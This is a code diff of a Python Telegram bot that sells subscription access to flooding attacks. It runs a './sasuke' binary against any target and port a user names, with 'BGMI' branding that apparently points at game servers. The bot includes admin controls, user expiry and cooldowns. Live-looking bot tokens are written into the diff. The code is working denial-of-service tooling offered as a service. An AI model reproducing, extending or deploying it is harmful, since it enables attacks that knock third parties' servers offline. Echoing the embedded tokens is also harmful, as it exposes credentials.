@@ -12,7 +12,7 @@ import logging
 import socket
 import pytz  # Import pytz for timezone handling
 
-bot = telebot.TeleBot('7599785141:AAHuEi4nik5vPSMDZ_g3jFlWeKTzRO53v6Y')
+bot = telebot.TeleBot('7858493439:AAGbtHzHHZguQoJzAney4Ccer1ZUisC-bDI')
 
 # Admin user IDs
 admin_id = ["7418099890"]
@@ -38,18 +38,14 @@ AK_BIN_PATH = 'KALUAA'
 
 
 # Function to read user IDs and their expiration times from Redis
-# Optimized read_users function with caching
 def read_users():
-    # Caching users to avoid fetching from Redis multiple times
-    if not hasattr(read_users, "cached_users"):
-        users = {}
-        for key in redis_client.scan_iter("user:*"):
-            user_id = key.decode("utf-8").split(":")[1]
-            expiration_time = redis_client.get(key).decode("utf-8")
-            if expiration_time:
-                users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
-        read_users.cached_users = users
-    return read_users.cached_users
+    users = {}
+    for key in redis_client.scan_iter("user:*"):
+        user_id = key.decode("utf-8").split(":")[1]  # Decode the key
+        expiration_time = redis_client.get(key).decode("utf-8")  # Decode the value
+        if expiration_time:
+            users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
+    return users
 
 # Function to save a user to Redis
 def save_user(user_id, expiration_time):
@@ -57,16 +53,14 @@ def save_user(user_id, expiration_time):
     redis_client.expireat(f"user:{user_id}", expiration_time.timestamp())  # Set TTL
 
 # Function to remove expired users from Redis
-# Optimized remove_expired_users function
 def remove_expired_users():
     current_time = datetime.now(IST)
     for key in redis_client.scan_iter("user:*"):
-        expiration_time = redis_client.get(key).decode("utf-8")
+        expiration_time = redis_client.get(key).decode("utf-8")  # Decode the value
         if expiration_time:
             exp_time = datetime.fromisoformat(expiration_time).astimezone(IST)
             if exp_time <= current_time:
                 redis_client.delete(key)
-
 
 # Handler for adding a user
 @bot.message_handler(commands=['add'])
@@ -135,7 +129,7 @@ def remove_user(message):
 def show_all_users(message):
     user_id = str(message.chat.id)
     if user_id in admin_owner:
-        users = read_users()  # Fetch from Redis using the optimized cached version
+        users = read_users()  # Fetch from Redis
         response = "Authorized Users:\n"
         current_time = datetime.now(IST)
 
@@ -151,7 +145,6 @@ def show_all_users(message):
     else:
         response = "Only Admin Can Run This Command."
     bot.reply_to(message, response)
-
         
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
@@ -162,10 +155,7 @@ def show_user_id(message):
 #Store ongoing attacks globally
 ongoing_attacks = []
 
-import asyncio
-
-# Non-blocking attack handler
-async def start_attack_reply_async(message, target, port, time):
+def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
 
@@ -179,7 +169,7 @@ async def start_attack_reply_async(message, target, port, time):
     })
 
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
-    await bot.reply_to(message, response)
+    bot.reply_to(message, response)
 
     full_command = f"./sasuke {target} {port} {time} 60"
     try:
@@ -196,12 +186,11 @@ async def start_attack_reply_async(message, target, port, time):
         })
         
         if result.returncode == 0:
-            await bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
+            bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
         else:
-            await bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
+            bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
     except Exception as e:
-        await bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")
-
+        bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")
 
         
 @bot.message_handler(commands=['status'])
@@ -225,7 +214,7 @@ def show_status(message):
 bgmi_cooldown = {}
 
 @bot.message_handler(commands=['matrix'])
-async def handle_matrix(message):
+def handle_matrix(message):
     remove_expired_users()  # Check for expired users
     user_id = str(message.chat.id)
     
@@ -241,7 +230,7 @@ async def handle_matrix(message):
     elif user_id in admin_owner or user_id in users:
         if user_id in admin_owner:
             # Admin owner can bypass cooldown
-            if len(command) == 4:  # Ensure proper command format
+            if len(command) == 4:  # Ensure proper command format (no threads argument)
                 try:
                     target = command[1]
                     port = int(command[2])  # Convert port to integer
@@ -250,9 +239,9 @@ async def handle_matrix(message):
                     if time > 180:
                         response = "Error: Time interval must be 180 seconds or less"
                     else:
-                        # Start the attack asynchronously without blocking the main thread
-                        await start_attack_reply_async(message, target, port, time)
-                        return  # Early return since response is handled asynchronously
+                        # Start the attack without setting a cooldown for admin owners
+                        start_attack_reply(message, target, port, time)
+                        return  # Early return since response is handled in start_attack_reply
                 except ValueError:
                     response = "Error: Please ensure port and time are integers."
             else:
@@ -267,7 +256,7 @@ async def handle_matrix(message):
                     response = f"You need to wait {time_left} seconds before using the /matrix command again."
                 else:
                     # Cooldown has expired, proceed with the command
-                    if len(command) == 4:  # Ensure proper command format
+                    if len(command) == 4:  # Ensure proper command format (no threads argument)
                         try:
                             target = command[1]
                             port = int(command[2])  # Convert port to integer
@@ -277,16 +266,16 @@ async def handle_matrix(message):
                                 response = "Error: Time interval must be 180 seconds or less"
                             else:
                                 # Start the attack and set the new cooldown
-                                await start_attack_reply_async(message, target, port, time)
+                                start_attack_reply(message, target, port, time)
                                 bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
-                                return  # Early return since response is handled asynchronously
+                                return  # Early return since response is handled in start_attack_reply
                         except ValueError:
                             response = "Error: Please ensure port and time are integers."
                     else:
                         response = "Usage: /matrix <target> <port> <time>"
             else:
                 # User not in cooldown, proceed with the command
-                if len(command) == 4:  # Ensure proper command format
+                if len(command) == 4:  # Ensure proper command format (no threads argument)
                     try:
                         target = command[1]
                         port = int(command[2])  # Convert port to integer
@@ -296,15 +285,15 @@ async def handle_matrix(message):
                             response = "Error: Time interval must be 180 seconds or less"
                         else:
                             # Start the attack and set the new cooldown
-                            await start_attack_reply_async(message, target, port, time)
+                            start_attack_reply(message, target, port, time)
                             bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
-                            return  # Early return since response is handled asynchronously
+                            return  # Early return since response is handled in start_attack_reply
                     except ValueError:
                         response = "Error: Please ensure port and time are integers."
                 else:
                     response = "Usage: /matrix <target> <port> <time>"
 
-    await bot.reply_to(message, response)
+    bot.reply_to(message, response)
 
 
 @bot.message_handler(commands=['help'])
@@ -422,19 +411,15 @@ def broadcast_message(message):
 
     bot.reply_to(message, response)
 
-import asyncio
-
-# Use asyncio to run the bot asynchronously
 def run_bot():
-    loop = asyncio.get_event_loop()
-    try:
-        print("Bot is running...")
-        loop.run_until_complete(bot.polling(none_stop=True, timeout=60))  # Use async polling
-    except Exception as e:
-        logging.error(f"An error occurred: {e}")
-        print(f"An error occurred: {e}")
-        time.sleep(15)  # Sleep before restarting the bot
+    while True:
+        try:
+            print("Bot is running...")
+            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
+        except Exception as e:
+            logging.error(f"An error occurred: {e}")
+            print(f"An error occurred: {e}")
+            time.sleep(15)  # Sleep before restarting the bot
 
 if __name__ == "__main__":
     run_bot()
-
